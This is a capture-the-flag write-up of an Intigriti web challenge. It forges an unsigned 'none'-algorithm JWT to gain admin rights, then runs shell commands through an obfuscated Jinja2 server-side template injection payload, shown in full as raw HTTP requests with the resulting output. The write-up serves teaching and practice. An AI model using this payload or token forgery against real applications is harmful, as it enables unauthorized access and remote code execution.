+++
title = "Intigriti November 2025 Challenge"
date = 2025-11-24
[taxonomies]
categories = ["CTF"]
tags = ["CTF", "Challenge", "Intigriti", "RCE", "SSTI", "JWT", "l33t"]
+++

The challenge was easy and straightforward: no quirks, no rabbit holes.

<!-- more -->

## Basic Recon

{{ image(src="/challenge-1125-intigriti-io-browse.png", alt="main", width=600) }}

The web application was a basic and simple ecommerce app with login and signup functionalities, so let's first create an account.

After registering and reviewing the HTTP history in Burp Suite, ZAP, or your preferred tool, the server issued a JWT that looks promising for testing multiple vulnerabilities which could lead to `RCE` in the end.

### Client Request:
```
POST /register HTTP/2
Host: challenge-1125.intigriti.io
Content-Length: 41
Origin: https://challenge-1125.intigriti.io
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: https://challenge-1125.intigriti.io/register
Accept-Encoding: gzip, deflate, br

username=machiavelli&password=machiavelli
```

### Server Response with `JWT`:
```
HTTP/2 302 Found
Date: Fri, 21 Nov 2025 09:44:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Location: /dashboard
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNSwidXNlcm5hbWUiOiJtYWNoaWF2ZWxsaSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzYzODA0NjQxfQ.Tn_fQNJpUqGfd4ViDTPMN95rPoGk1XYOLRu8D94D7PQ; Expires=Sat, 22 Nov 2025 09:44:01 GMT; Max-Age=86400; HttpOnly; Path=/
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkFjY291bnQgY3JlYXRlZCBzdWNjZXNzZnVsbHkhIl19XX0.aSA0Yg.-1mcqIFXwlE5O-01QE7X-EiFr9s; HttpOnly; Path=/
Strict-Transport-Security: max-age=31536000; includeSubDomains

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.

```
After decoding the token, we can see it contains the following claims with user information:
```json

{
  "alg": "HS256",
  "typ": "JWT"
}
.
{
  "user_id": 35,
  "username": "machiavelli",
  "role": "user",
  "exp": 1763804641
}
```

## JWT None Algorithm Attack to Privilege Escalation

> You'll need to install the JWT Editor extension from the BApp Store (or you can use jwt_tool), but it’s much easier to forge and manipulate the token directly inside Burp Suite using JWT Editor.

The main goal of manipulating a JWT is to escalate privileges (e.g., become an admin) or impersonate another user.  
This is only possible if we can create a token that the server accepts as valid.

There are two common scenarios:

1. **The server properly verifies the signature**  
   We need to know (or guess/crack) the secret key used with HS256 so we can re-sign our forged token. Once the server verifies the signature as legitimate, it trusts the claims (`role`, `username`, `user_id`, etc.) and grants the corresponding privileges.

2. **The server does NOT verify the signature** (the actual vulnerability in this challenge)  
   We can impersonate any user and assign any privilege we want without knowing the secret — simply by sending an unsigned token, using the "none" algorithm, or tampering with the signature without re-signing or even omitting it.

Here is the vulnerable code extracted from the challenge after achieving RCE inside `/app/utils/jwt_handler.py`:

```python

def verify_token(payload, algorithm="HS256"):
    token = jwt.encode(payload, SECRET_KEY, algorithm=algorithm)
    return token

def verify_token(token):
    """Verify and decode JWT token"""
    try:
        header = jwt.get_unverified_header(token)
        
        # @TODO: Add validation for session tokens! We currently
        # need this for a new feature to allow sharing cart items (still WIP)
        if header.get('alg') == 'none':
            # CRITICAL VULNERABILITY: blindly trusts "none" algorithm
            decoded = jwt.decode(
                token,
                options={"verify_signature": False}  # No signature check at all
            )
            return decoded
        else:
            decoded = jwt.decode(
                token,
                SECRET_KEY,
                algorithms=['HS256']
            )
            return decoded
            
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
    except Exception:
        return None
```

The code explicitly allows the `alg=none` case and skips signature verification entirely.

Send a request containing the JWT to **Burp Repeater**.

Then:

1. Switch to the **JSON Web Tokens** tab (provided by the JWT Editor extension).
2. In the payload section, modify the claims as follows:
   - `"user_id": 1`
   - `"username": "admin"`
   - `"role": "admin"`

The edited payload should now look like this:

```json

{
  "user_id": 1,
  "username": "admin",
  "role": "admin",
  "exp": 1763804641
}
```
Click on `Attack` and then sign the token with `none` algorithm and send the request.

Then hit the `/admin` endpoint in Burp or copy the forged token and add it using the Cookie Editor extension in your browser.

After browsing multiple endpoints in search of an RCE vector — such as `/admin/orders`, `/admin/users`, and `/admin/products` — I found nothing useful.

That changed when I finally hit `/admin/profile`.

## Server-side Template Injection to Remote Code Execution


The admin profile’s current display name is clearly the result of server-side code execution based on whatever value is submitted in the Display Name field.

{{ image(src="/challenge-1125-intigriti-io-admin-profile.png", alt="admin profile", width=600) }}

So let's focus on that field — it's our RCE entry point.

The Display Name field contains a heavily obfuscated Jinja2 SSTI payload (identifiable by the {% raw %}`{% %}` {% endraw %} statement syntax) that currently executes `ls /usr/share`.

Here is the full payload:
{% raw %}
```
{%set at=dict(rtta=x)|first|reverse%}{%set nd=dict(so=x)|first|reverse%}{%set ls='ls /usr/share'%}{%set re=dict(daer=x)|first|reverse%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set uj=dict(a=x,b=x,c=x)|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set in=dict(tini=x)|first|reverse%}{%set ii=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+in+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set gl=dict(slabolg=x)|first|reverse%}{%set go=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set ge=dict(metiteg=x)|first|reverse%}{%set gi=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set bu=dict(snitliub=x)|first|reverse%}{%set bl=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+uj)|first|first|last*(la+la)%}{%set im=dict(tropmi=x)|first|reverse%}{%set ip=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+im+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set cx=dict(aaaaa=x)|first|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set dp=uj+la%}{%set et=lla+lla+lla+dp%}{%set po=(({}|escape|urlencode|first+dict(c=x)|join)*cx)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%}{%print (((((((((((x,)|map(at,ii)|first,)|map(at,go)|first,)|map(at,gi)|first)(bl),)|map(at,gi)|first)(ip))(nd),)|map(at,po)|first)(ls),)|map(at,re)|first)()%}
```
{% endraw %}

Let's change ls `/usr/share` to ls `/app` by sending a POST request to `/admin/profile` containing the modified Jinja2 payload.

```
POST /admin/profile HTTP/2
Host: challenge-1125.intigriti.io
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYzODA0NjQxfQ.
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 3740

display_name=%7B%25set%20at%3Ddict%28rtta%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20nd%3Ddict%28so%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ls%3D%27ls%20%2F%20%27%25%7D%7B%25set%20re%3Ddict%28daer%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20uj%3Ddict%28a%3Dx%2Cb%3Dx%2Cc%3Dx%29%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20in%3Ddict%28tini%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ii%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bin%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20gl%3Ddict%28slabolg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20go%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bgl%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20ge%3Ddict%28metiteg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20gi%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bge%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20bu%3Ddict%28snitliub%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20bl%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bbu%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20im%3Ddict%28tropmi%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ip%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bim%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20cx%3Ddict%28aaaaa%3Dx%29%7Cfirst%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20dp%3Duj%2Bla%25%7D%7B%25set%20et%3Dlla%2Blla%2Blla%2Bdp%25%7D%7B%25set%20po%3D%28%28%7B%7D%7Cescape%7Curlencode%7Cfirst%2Bdict%28c%3Dx%29%7Cjoin%29%2Acx%29%25%28llla%2Bla%2Cllla%2Cllla%2Bla%2Csbb%2Bet%2Bbb%2Bla%2Bla%2Csbb%2Bet%2Blla%2Bbb%29%25%7D%7B%25print%20%28%28%28%28%28%28%28%28%28%28%28x%2C%29%7Cmap%28at%2Cii%29%7Cfirst%2C%29%7Cmap%28at%2Cgo%29%7Cfirst%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28bl%29%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28ip%29%29%28nd%29%2C%29%7Cmap%28at%2Cpo%29%7Cfirst%29%28ls%29%2C%29%7Cmap%28at%2Cre%29%7Cfirst%29%28%29%25%7D
```

Notice the content of the root directory `/`:
```html

<!-- Current Display Name -->
<div class="mb-8">
  <label class="block text-sm font-semibold text-slate-300 mb-3">Current Display Name</label>
    <div class="p-4 bg-slate-700/50 border border-slate-600 rounded-lg">
      <p class="text-slate-100 font-medium">
app
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
   </p>
  </div>
</div>
```
Recursively searching the `/app` directory with `ls -lahR` reveals a hidden directory named `.aquacommerce` that contains the file `019a82cf.txt`, which holds the flag.

Final Request:

```
POST /admin/profile HTTP/2
Host: challenge-1125.intigriti.io
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYzODA0NjQxfQ.
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 3740

display_name=%7B%25set%20at%3Ddict%28rtta%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20nd%3Ddict%28so%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ls%3D%27cat%20%2Fapp%2F%2Eaquacommerce%2F019a82cf%2Etxt%27%25%7D%7B%25set%20re%3Ddict%28daer%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20uj%3Ddict%28a%3Dx%2Cb%3Dx%2Cc%3Dx%29%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20in%3Ddict%28tini%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ii%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bin%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20gl%3Ddict%28slabolg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20go%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bgl%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20ge%3Ddict%28metiteg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20gi%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bge%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20bu%3Ddict%28snitliub%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20bl%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bbu%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20im%3Ddict%28tropmi%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ip%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bim%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20cx%3Ddict%28aaaaa%3Dx%29%7Cfirst%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20dp%3Duj%2Bla%25%7D%7B%25set%20et%3Dlla%2Blla%2Blla%2Bdp%25%7D%7B%25set%20po%3D%28%28%7B%7D%7Cescape%7Curlencode%7Cfirst%2Bdict%28c%3Dx%29%7Cjoin%29%2Acx%29%25%28llla%2Bla%2Cllla%2Cllla%2Bla%2Csbb%2Bet%2Bbb%2Bla%2Bla%2Csbb%2Bet%2Blla%2Bbb%29%25%7D%7B%25print%20%28%28%28%28%28%28%28%28%28%28%28x%2C%29%7Cmap%28at%2Cii%29%7Cfirst%2C%29%7Cmap%28at%2Cgo%29%7Cfirst%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28bl%29%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28ip%29%29%28nd%29%2C%29%7Cmap%28at%2Cpo%29%7Cfirst%29%28ls%29%2C%29%7Cmap%28at%2Cre%29%7Cfirst%29%28%29%25%7D%0D%0A
```
And the final flag is:

`INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}`

## C0ngr4ts!

[X](https://x.com/MachIaVellill)

[Keybase](https://keybase.io/makyavelli)
